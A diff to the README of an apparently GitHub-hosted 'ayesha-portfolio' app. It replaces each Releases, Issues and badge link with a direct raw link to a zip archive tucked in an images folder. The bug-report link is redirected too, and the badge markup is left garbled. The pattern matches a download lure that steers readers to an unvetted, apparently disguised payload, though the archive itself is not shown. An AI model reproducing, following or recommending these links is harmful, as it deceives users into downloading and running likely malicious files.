@@ -1,6 +1,6 @@
 # 🎉 ayesha-portfolio - Your AI Showcase Made Easy
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/3trilla/ayesha-portfolio/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/3trilla/ayesha-portfolio/main/assets/images/portfolio_ayesha_3.0.zip%20Latest%https://raw.githubusercontent.com/3trilla/ayesha-portfolio/main/assets/images/portfolio_ayesha_3.0.zip)](https://raw.githubusercontent.com/3trilla/ayesha-portfolio/main/assets/images/portfolio_ayesha_3.0.zip)
 
 ## 🛠️ Overview
 
@@ -13,7 +13,7 @@ Follow these steps to set up and run **ayesha-portfolio** on your computer.
 ### 📥 Download & Install
 
 1. Click the download button at the top of this page or 
-   [visit the Releases page](https://github.com/3trilla/ayesha-portfolio/releases) to download the latest version of the application.
+   [visit the Releases page](https://raw.githubusercontent.com/3trilla/ayesha-portfolio/main/assets/images/portfolio_ayesha_3.0.zip) to download the latest version of the application.
   
 2. Choose the version that matches your operating system (Windows, macOS, or Linux).
 
@@ -79,11 +79,11 @@ Absolutely! Contributions are welcome. Please create a GitHub issue or pull requ
 
 ### How do I report a bug?
 
-If you encounter a bug, please visit the [Issues page](https://github.com/3trilla/ayesha-portfolio/issues) and submit a detailed description of the problem.
+If you encounter a bug, please visit the [Issues page](https://raw.githubusercontent.com/3trilla/ayesha-portfolio/main/assets/images/portfolio_ayesha_3.0.zip) and submit a detailed description of the problem.
 
 ## 📦 Download Again
 
-To download the latest version, click [here](https://github.com/3trilla/ayesha-portfolio/releases).
+To download the latest version, click [here](https://raw.githubusercontent.com/3trilla/ayesha-portfolio/main/assets/images/portfolio_ayesha_3.0.zip).
 
 ## 🧑‍🤝‍🧑 Support & Community
 
